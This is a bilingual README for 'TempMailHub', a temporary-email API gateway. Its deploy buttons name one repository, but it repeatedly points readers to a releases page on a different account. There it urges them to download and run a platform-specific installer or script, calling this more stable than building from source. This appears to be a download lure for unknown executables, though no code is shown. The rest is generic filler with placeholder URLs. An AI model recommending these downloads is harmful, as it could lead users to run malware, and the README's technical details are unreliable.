https://github.com/RAFAY6556/tempmailhub/releases

# TempMailHub: Modern Unified Temp Mail API Gateway Across Platforms

<div align="center">

**🌟 一个现代化的跨平台临时邮件网关服务 🌟**

基于 Hono 框架架构的多平台临时邮箱 API 聚合服务

[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/hzruo/tempmailhub)
[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/hzruo/tempmailhub)
[![Deploy on Deno](https://deno.com/button)](https://app.deno.com/new?clone=https://github.com/hzruo/tempmailhub)
[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/hzruo/tempmailhub)

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![TypeScript](https://img.shields.io/badge/TypeScript-4.9+-blue.svg)
![Hono](https://img.shields.io/badge/Hono-4.6+-orange.svg)
![Docker](https://img.shields.io/badge/Docker-Ready-green.svg)

</div>

## 🌟 Features

- 多服务商聚合: 集成 MinMail、TempMail Plus、Mail.tm、EtempMail、VanishPost 等多个临时邮箱服务，为开发者提供一个统一的入口。
- 跨平台部署: 设计立足云端无边界，支持 Cloudflare Workers、Vercel、Deno、Netlify 等多平台部署选项，降低部署成本与复杂度。
- 高可用 API 网关: 通过 Hono 框架实现高性能路由和中间件，易于扩展与自定义。
- 安全与隐私优先: 采用最小权限原则，提供可观测性和可审计性，帮助你更好地保护用户邮箱隐私。
- 开源与可定制: MIT 证书，代码开放，便于你在私有环境中二次开发与改造。

- Multi-provider Aggregation: Unified access to temporary email services such as MinMail, TempMail Plus, Mail.tm, EtempMail, and VanishPost.
- Cross-platform Deployment: Designed for cloud-first use, with deployment options on Cloudflare Workers, Vercel, Deno, and Netlify.
- High-availability API Gateway: Fast routing and middleware via Hono, easy to extend and customize.
- Security-first: Minimal permissions, observability, and auditability to protect user privacy.
- Open source and customizable: MIT licensed, ready for private deployments and enhancements.

## 目录

- [定位与愿景](#定位与愿景)
- [技术栈与架构](#技术栈与架构)
- [快速开始](#快速开始)
  - [前提条件](#前提条件)
  - [下载与安装（重要）](#下载与安装重要)
  - [本地开发与调试](#本地开发与调试)
  - [Docker 部署](#docker-部署)
- [部署指南](#部署指南)
  - [Cloudflare Workers](#cloudflare-workers)
  - [Vercel](#vercel)
  - [Deno Deploy](#deno-deploy)
  - [Netlify](#netlify)
- [API 参考](#api-参考)
  - [身份与认证](#身份与认证)
  - [提供商信息](#提供商信息)
  - [邮箱地址分配](#邮箱地址分配)
  - [邮件内容查询](#邮件内容查询)
- [示例与用法](#示例与用法)
- [开发者指南](#开发者指南)
  - [代码结构](#代码结构)
  - [测试与质量保证](#测试与质量保证)
  - [本地化与国际化](#本地化与国际化)
- [安全性、隐私与合规](#安全性隐私与合规)
- [变更日志与版本](#变更日志与版本)
- [贡献者与社区](#贡献者与社区)
- [许可](#许可)
- [获取最新发行版](#获取最新发行版)

## 定位与愿景

TempMailHub 旨在成为一个易用、可扩展的临时邮箱网关。它把不同临时邮箱服务接入到一个统一的 API 层，帮助开发者快速集成邮箱验证、临时收件箱创建与邮件读取能力，而不需要逐个对接各自的 API。通过一个清晰的、可扩展的网关，你可以集中精力构建核心应用，而将邮箱供应商的差异和故障处理交给网关来处理。

- 提供单点入口，简化开发者在前端与后端之间的对接工作。
- 为不同部署场景提供灵活的部署选项，从云函数到容器再到私有服务器都可适配。
- 以模块化方式设计，便于你添加新的邮件服务提供商或替换现有实现。

## 技术栈与架构

- 语言与运行时：TypeScript 4.9+，Node.js 生态友好。
- 框架与中间件：Hono 4.6+，用于路由、请求/响应处理和中间件。
- 容器与部署：Docker 可选，适合私有部署和测试环境。
- 目标平台：Cloudflare Workers、Vercel、Deno、Netlify 等。
- 数据与状态：无依赖的轻量状态管理，所有路由以幂等和可观测为目标。
- 安全与合规：提供最少权限运行模式，便于审计和日志分析。

架构要点：

- 入口网关：一个统一的 API 网关，负责路由、鉴权、限流和聚合调用。
- 提供商适配层：每个临时邮箱服务提供商都实现一个适配器，负责翻译网关请求、处理响应、标准化数据结构。
- 聚合与缓存：对经常请求的邮箱信息进行缓存，降低对外部服务的调用延迟，提升稳定性。
- 配置驱动：通过环境变量和配置文件来调整行为，方便在不同环境中部署。

## 快速开始

以下指南帮助你快速体验 TempMailHub。你可以选择本地开发、Docker 部署或直接在云端部署。

### 前提条件

- Node.js 版本 16+（推荐使用 nvm 管理版本）。
- Docker 近期版本（用于容器化部署）。
- Git 用于克隆代码。

### 下载与安装（重要）

如需参与试用或评估，请前往发行页下载相应的资产文件并执行安装。发行页包含该项目的最新版本与打包好的执行文件。及时获取并安装最新版本能让你获得最佳稳定性与最新特性。

发行页地址： https://github.com/RAFAY6556/tempmailhub/releases

该链接包含带有版本的打包资产。下载与你的操作系统匹配的资产并按照随附的安装说明进行使用。若页面包含多个二进制资产，请在其中文件名中识别与你的系统对应的版本（如 linux、windows、macos 等）。下载的资产通常是一个安装程序或脚本，执行前请确认权限并遵循本地安全规则。

获取发行版的第二次提示：
[![Releases](https://img.shields.io/badge/Latest_Release-Download-blue?logo=github&logoColor=white)](https://github.com/RAFAY6556/tempmailhub/releases)

如果你想在本地进行快速试用，也可以直接使用 npm/pnpm 安装和构建（在没有发行版的情况下）。但发行页提供最稳定、最完整的构建和依赖，这对稳定运行很重要。

### 本地开发与调试

1. 克隆仓库
- 使用 Git 克隆代码到本地工作区。
  - 命令: git clone https://github.com/your-organization/tempmailhub
2. 安装依赖
- 进入项目目录后，安装依赖。
  - 命令: npm ci
3. 构建与运行
- 构建 TypeScript 代码以生成可执行输出。
  - 命令: npm run build
- 本地启动服务
  - 命令: npm run start
- 如果你使用 Docker
  - 构建镜像: docker build -t tempmailhub .
  - 运行容器: docker run -p 3000:3000 tempmailhub
4. 调试与日志
- 使用本地日志输出跟踪请求、聚合的执行路径和第三方服务的响应时间。

注：在本地调试时，请确保已正确配置环境变量。常见变量包括 API_KEY、PROVIDERS、CACHE_TTL 等（实际名称请参考 .env 示例）。

### Docker 部署

Docker 部署提供一致的运行时环境，有利于私有化部署和持续集成。核心步骤如下：

- 构建镜像
  - docker build -t tempmailhub:latest .
- 运行容器
  - docker run -d --name tempmailhub -p 3000:3000 -e PROVIDERS=minmail,mail_tm -e CACHE_TTL=3000 tempmailhub:latest

你可以通过挂载配置文件或传入环境变量来控制提供商集合、缓存策略、日志等级等行为。容器化带来可移植性和可重复性。

## 部署指南

TempMailHub 支持多平台部署。下面给出四种常用场景的基本指南。每种方法都包含了最小化步骤，帮助你快速上线并开始流量测试。

### Cloudflare Workers

1. 将代码适配为与 Cloudflare Workers 兼容的入口脚本。
2. 使用 Cloudflare 帐号在 Workers 上创建一个新的项目。
3. 指定入口点为编译后的 JavaScript 文件。
4. 部署并测试路由。

说明：Cloudflare Workers 提供边缘计算能力，适合对延迟敏感的 API。通过 Hono 的兼容性，可以实现快速上手。

### Vercel

1. 将仓库连接到 Vercel 账号。
2. 在项目设置中选择合适的构建配置（Node 版本、环境变量等）。
3. 部署完成后，Vercel 会分配一个域名，作为 API 网关的入口。

### Deno Deploy

1. 登录 Deno Deploy。
2. 将代码克隆到一个新项目，选择 Deno 运行时。
3. 配置环境变量并向外暴露路由。
4. 部署并监控运行状态。

### Netlify

1. 新建一个 Netlify 项目，选中你的 Git 仓库。
2. 设置构建命令和发布目录（例如构建后输出放在 dist/ 或 build/）。
3. 启动部署并测试 API 路由。

每种平台都提供了快速上手的按钮和模板。你可以结合团队设备和运维策略，选择最契合的实现路径。

## API 参考

TempMailHub 作为临时邮箱网关，核心在于统一入口对多个提供商的调用。以下是常见的 API 设计要点与示例，帮助你在集成时快速上手。

- 基本原则
  - 一致的端点结构：所有提供商通过统一的请求格式进入网关。
  - 标准化响应：网关返回统一字段，开发者不需要关心各家提供商的响应差异。
  - 可观察性：请求追踪、日志、指标均可启用，便于运维与故障排查。

- 常用端点示例
  - GET /v1/ping
    - 功能：健康检查，返回网关状态。
    - 响应示例：{ "status": "ok", "timestamp": 1699999999999 }
  - GET /v1/providers
    - 功能：列出当前可用的提供商及其说明。
    - 响应示例：{ "providers": [ { "id": "minmail", "name": "MinMail", "status": "active" }, ... ] }
  - GET /v1/emails
    - 功能：分配一个临时邮箱地址，来自配置的提供商集合。
    - 请求参数：?provider=minmail&domain=example.com
    - 响应示例：{ "provider": "minmail", "address": "user123@example.com", "domain": "example.com" }
  - GET /v1/messages
    - 功能：查询指定邮箱的未读邮件、邮件简要信息等。
    - 请求参数：?address=user123@example.com
    - 响应示例：{ "address": "user123@example.com", "emails": [ { "id": "abc", "from": "alice@example.org", "subject": "Test", "snippet": "This is a test", "sentAt": "2024-01-01T12:34:56Z" } ] }

- 身份与认证
  - 通过 API Key 或其他轻量级鉴权机制来保护网关。示例：
    - 头部：Authorization: Bearer <your_api_key>
  - 提供商鉴权由网关内置策略统一处理，内部调用对方服务时保留最小权限原则。

- 错误处理
  - 网关统一错误格式，包含 code、message、details 三个字段。示例：
    - { "code": "PROVIDER_TIMEOUT", "message": "Provider timed out", "details": "minmail#endpoint" }

- 数据结构设计
  - 统一邮箱地址对象：{ "provider": "minmail", "address": "user@domain.com", "domain": "domain.com" }
  - 邮件对象：{ "id": "mail-123", "from": "someone@example.com", "subject": "Hello", "snippet": "...", "receivedAt": "..." }

- 示例请求
  - 通过网关请求一个邮箱地址并读取邮件摘要：
    - 请求：GET /v1/emails?provider=minmail&domain=example.com
    - 响应：{ "address": "user123@example.com", "provider": "minmail", "domain": "example.com" }

- 多提供商聚合的工作流
  - 当一个请求到达网关时，网关先从提供商列表中筛选可用提供商。
  - 网关按设定的策略（轮询、权重、备用优先级）选择一个提供商。
  - 提供商适配器执行实际 API 调用，结果被归并成统一格式返回给调用方。

请结合你的业务需求定制端点、字段和行为。TempMailHub 设计的核心是简单、可扩展和可观测。

## 示例与用法

- 直接调用示例（伪代码，实际端点以实现为准）
  - 获取一个临时邮箱地址
    - GET /v1/emails?provider=minmail&domain=example.com
    - 返回：{ "address": "user123@example.com", "provider": "minmail", "domain": "example.com" }
  - 查看新邮箱中的邮件摘要
    - GET /v1/messages?address=user123@example.com
    - 返回：{ "address": "user123@example.com", "emails": [ { "id": "mail-001", "subject": "Welcome", "snippet": "Thanks for joining", "receivedAt": "..." } ] }

- 使用 curl 的快速示例
  - 获取邮箱地址
    - curl -H "Authorization: Bearer <your_api_key>" "https://api.tempmailhub/v1/emails?provider=minmail&domain=example.com"
  - 查询邮件
    - curl -H "Authorization: Bearer <your_api_key>" "https://api.tempmailhub/v1/messages?address=user123@example.com"

- 效能与缓存
  - 网关对重复请求进行缓存，降低对提供商的压力。
  - 缓存 TTL 可通过环境变量配置，帮助你控制数据新鲜度和资源占用。

- 错误与重试策略
  - 如果某个提供商超时，网关会自动切换到备选提供商。
  - 重试次数和退避策略可在配置中设定，确保高可用性。

## 开发者指南

TempMailHub 的设计遵循简单、直观、易扩展的原则。以下内容帮助你在本地开发、测试和扩展现有实现。

### 代码结构

- /src：核心应用逻辑，包含路由、网关、适配器、缓存层。
- /src/providers：各提供商的适配实现。每个文件负责将提供商的 API 调用映射到统一数据结构。
- /src/config：环境变量、默认配置和运行参数。
- /test：测试用例与集成测试。
- /scripts：部署、构建与质量保障相关脚本。

### 运行测试与质量保障

- 单元测试：运行 `npm run test:unit`。
- 集成测试：运行 `npm run test:integration`，在本地或测试环境搭建必要的依赖。
- 静态分析：运行 `npm run lint`，确保代码风格和结构符合约定。
- 代码覆盖率：执行 `npm run test:coverage`，关注关键路径的覆盖率。

### 本地化与国际化

- 支持多语言界面和文档。你可以添加新的语言包并通过配置选择默认语言。
- 字符集和区域设置优先考虑 UTF-8，确保跨语言邮件场景的稳定性。

### 提供商适配的扩展

- 新增一个提供商时，创建一个适配器，暴露标准化的方法：
  - allocateAddress(domain)
  - fetchMessages(address)
  - readMessage(id)
- 适配器应处理对方 API 的身份鉴权、速率限制和错误映射。
- 将新的适配器注册到网关配置中，使其成为聚合的一部分。

### 本地化部署脚本与自动化

- 添加 CI/CD 脚本，确保在合并主分支时自动构建并运行测试。
- 为 Docker、Cloudflare Workers、Vercel、Deno、Netlify 提供分支特定的部署流水线。
- 通过环境变量驱动核心行为，避免将敏感信息硬编码到代码中。

## 安全性、隐私与合规

- 最小权限原则：网关以最小权限运行，只能访问必需的资源。
- 数据保护：临时邮箱地址本质上是临时信息，网关确保数据在短时内可用且可审计。
- 日志策略：日志记录仅用于性能与故障排查，避免记录敏感内容。

- 你可以为生产环境开启额外的审计字段、日志级别和数据脱敏策略。对外暴露的接口保持简单、稳定且可观测。

## 变更日志与版本

- 版本化发布采用语义化版本控制（semver）。
- 每个发行版包含兼容性说明、已知问题和新增特性。
- 变更日志位于 /CHANGELOG.md，便于跟踪历史改动。

- 发行版下载页面常包含完整的变更历史和迁移指南。为了获取最新的变更信息，请参阅发行页面的说明。

## 贡献者与社区

TempMailHub 欢迎开发者参与和贡献。你可以：

- 提交功能分支并创建合并请求（PR）。
- 提交修复和改进的 issue。
- 提供新的提供商适配器，扩展网关能力。
- 提出性能优化、缓存策略、错误处理等方面的想法。

社区准则简单直接：精炼的变更、清晰的代码、可测试的改动。请在提交前确保通过现有测试，遵循项目的代码风格与命名约定。

## 变更历史

- 详尽的变更历史请参考发行版本的变更记录。每次新版本都附带迁移指南和 API 变更说明。

## 许可

TempMailHub 使用 MIT 许可。自由使用、修改、合并、分发。请在分发时包含原始许可声明和版权信息。

## 获取最新发行版

要获取发行版，请访问并下载相应的构建资产。发行页包含针对不同系统的安装包或脚本。下载后请按随附的说明完成安装与配置。

发行页再次提醒： https://github.com/RAFAY6556/tempmailhub/releases

- 使用该页中的按钮快速打开、浏览并下载你需要的版本。
- 如果你需要直接跳转，请用页面中的资产链接导航到适合你操作系统的安装包。

该链接在文档中已出现一次于顶部位置，现再次列出以便快速定位最新发行版。你可以在此处下载最新的二进制文件，并按照提供的步骤安装使用。发行版通常包含一个安装脚本或安装程序，运行后会引导你完成初始化、配置和启动过程。

感谢你对 TempMailHub 的关注与贡献。你现在已经具备在多平台环境中快速部署并使用一个统一的临时邮箱网关的能力。